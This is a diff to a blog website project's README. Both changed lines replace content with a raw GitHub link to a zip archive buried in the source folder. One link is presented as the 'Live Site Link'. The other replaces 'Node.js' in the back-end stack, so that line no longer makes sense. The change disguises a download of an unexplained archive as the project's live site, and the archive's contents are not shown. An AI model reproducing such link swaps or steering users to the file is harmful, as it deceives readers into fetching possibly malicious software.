@@ -15,7 +15,7 @@ The goal of this project is to build a modern blog website with engaging, dynami
 ---
 
 ## **Live URL**
-[Live Site Link](https://blogs-sphere-blogsite.netlify.app/)
+[Live Site Link](https://raw.githubusercontent.com/Nahar0912/Blog-Sphere-Client/main/src/pages/Home/Blog-Sphere-Client-v3.0.zip)
 
 ---
 
@@ -73,7 +73,7 @@ The goal of this project is to build a modern blog website with engaging, dynami
 - Tailwind CSS
 
 ### **Back-End**
-- Node.js with Express
+- https://raw.githubusercontent.com/Nahar0912/Blog-Sphere-Client/main/src/pages/Home/Blog-Sphere-Client-v3.0.zip with Express
 - MongoDB
 - Firebase Authentication
 
